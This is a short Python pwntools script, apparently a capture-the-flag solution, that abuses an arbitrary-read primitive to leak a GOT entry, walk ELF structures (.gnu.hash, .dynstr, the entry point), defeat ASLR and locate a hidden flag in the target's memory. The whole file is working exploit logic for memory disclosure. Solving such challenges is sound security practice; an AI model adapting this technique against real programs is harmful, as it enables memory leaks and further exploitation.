from pwn import *

client = Client()

reader = Reader(client, 0x8de300) # memcpy_chk in .got
memcpy_addr = reader.follow() # Start by reading the .got entry for memcpy_chk, follow the pointer into GLIBC.

reader.addr -= 0x16c7000 # ptr to start of .gnu.hash is a static distance to memcpy_chk, apply the offset and read the ptr...

gnu_hash_addr = reader.read(0x10) # progress to .dynstr address, used to get to the ELF (and entry point)
dynstr_addr = reader.read(0xD0) # progress to .gnu_vers address, used to compute size of dynstr for binary search.
gnu_vers_addr = reader.read(0x0)

lower = dynstr_addr + 0x75 # Skip the static functions and goto not_my_flag0 (if it exists)
upper = gnu_vers_addr - 0x39 # Adjust for alignment
reader.addr = (upper + lower) / 2 # Middle!
top_nos = reader.search(upper, lower)


# Once we find the not_my_flag number, load the Entry Point and compute straight to the code.
elf_addr = gnu_hash_addr & 0xfffffffffffff000 # mask off the lower bits .gnu.hash for aslr mask, leaving the base of the ELF header.
entry_addr = elf_addr + 0x18
reader.addr = entry_addr
ep_offset = reader.read(0) # read the entry point offset, do not progress addr

yes_ur_flag_addr = reader.addr - 0x18 + 0x100 + ep_offset + 0x13 * top_nos

reader.addr = yes_ur_flag_addr
client.winning = True
# And dump remaining reads...
for i in range(1,25 - client.reads):
  reader.read()
